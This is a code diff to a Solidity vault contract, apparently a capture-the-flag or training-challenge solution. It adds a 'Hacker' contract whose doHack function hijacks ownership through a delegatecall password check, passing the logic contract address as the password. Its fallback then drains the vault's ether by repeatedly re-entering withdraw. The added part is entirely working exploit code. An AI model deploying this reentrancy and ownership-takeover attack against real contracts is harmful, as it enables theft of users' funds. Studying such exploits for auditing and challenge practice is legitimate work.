@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import {console} from "../lib/forge-std/src/console.sol";
+
 contract VaultLogic {
 
   address public owner;
@@ -73,5 +75,42 @@ contract Vault {
     }
 
   }
+
+}
+
+contract Hacker{
+
+  address public player;
+  address payable public vaultAddress;
+  address public logicAddress;
+
+  constructor(address _vaultAddress,address _logicAddress) {
+    player = msg.sender;
+    vaultAddress = payable(_vaultAddress);
+    logicAddress = _logicAddress;
+  }
+
+  function doHack() public payable {
+    //deposit
+    Vault(vaultAddress).deposite{value: 0.01 ether}();
+
+    vaultAddress.call(
+      abi.encodeWithSignature("changeOwner(bytes32,address)",logicAddress,address (this))
+    );
+    //withdraw
+    Vault(vaultAddress).openWithdraw();
+    Vault(vaultAddress).withdraw();
+
+    payable(msg.sender).transfer(address (this).balance);
+  }
+
+  fallback() payable external{
+    if(vaultAddress.balance < 0.01 ether){
+      return;
+    }
+    Vault(vaultAddress).withdraw();
+  }
+
+
 
 }
